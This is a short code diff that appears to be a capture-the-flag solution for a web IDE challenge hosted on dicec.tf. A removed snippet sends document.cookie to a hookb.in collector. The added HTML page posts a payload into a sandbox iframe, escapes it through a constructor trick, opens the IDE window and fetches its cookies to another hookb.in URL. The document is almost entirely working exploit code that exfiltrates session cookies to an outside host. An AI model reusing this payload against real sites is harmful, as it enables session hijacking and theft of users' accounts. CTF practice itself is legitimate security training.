@@ -1,4 +1,15 @@
-const Http = new XMLHttpRequest();
-const url='https://hookb.in/b9RxGp1e9Pt3DDogQpnZ?a='+document.cookie;
-Http.open('GET', url);
-Http.send();})";
+<html>
+    <body>
+        <iframe src="https://web-ide.dicec.tf/sandbox.html" frameborder="0"></iframe>
+        <script>
+            iframe = document.querySelector('iframe');
+              iframe.onload = () => iframe.contentWindow.postMessage(
+                `[].constructor.constructor('`+
+                    `var w1 = window.open("https://web-ide.dicec.tf/ide");`+
+                    `setTimeout(()=>{`+
+                        `fetch("https://hookb.in/zrzE6xpxjNfykkGKwVLd?a="+w1.document.cookie);`+
+                    `}, 2000);`+
+                    `')()`, '*');
+        </script>
+    </body>
+</html>
